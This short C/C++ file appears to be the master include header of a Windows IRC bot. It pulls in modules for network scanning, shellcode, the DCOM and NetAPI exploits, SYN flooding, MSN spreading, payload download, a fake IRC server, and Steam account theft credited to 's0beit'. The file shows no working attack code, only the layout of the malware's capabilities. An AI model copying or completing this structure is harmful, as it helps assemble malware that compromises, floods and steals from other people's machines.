#define _WIN32_WINNT	0x0403				
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker,"/RELEASE")			
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	
#pragma comment(linker,"/IGNORE:4078")


#include <winsock2.h>
#include <sql.h>
#include <sqlext.h>
#include <iostream>
#include <string>
#include <sstream>
#include <stdarg.h>
#include <windows.h>
#include <vector>
#include <algorithm>
#include <lm.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <wininet.h>
#include <shellapi.h>
#include <winable.h>
#include <malloc.h>
#include <Lm.h>
//#include <stdarg.h>



#include "Psapi.h" 
#pragma comment(lib,"psapi.lib") 

#include <process.h>
#include <winsvc.h>

//main
#include "defines.h"
#include "nbot.h"
#include "threads.h"
#include "tcpip.h"
//base
#include "uninstall.h"
#include "other.h"
#include "download.h"
#include "registry.h"
//#include "service.h"
//scanning
#include "Scanner.h"
#include "thread.h"
#include "shellcode.h"
#include "transfer.h"
#include "zip.h"
#include "msn.h"

#include "dcom2.h"
#include "netapi.h"
#include "moduleincludes.h"
#include "SkySyn.h"
#include "Honeypot.h"
#include "fakeircd.h"
#include "steam.h"
#include "steam_.h"
#include "base64.h"
#include "Blowfish.h"

/* Credits to s0beit for his steam code*/

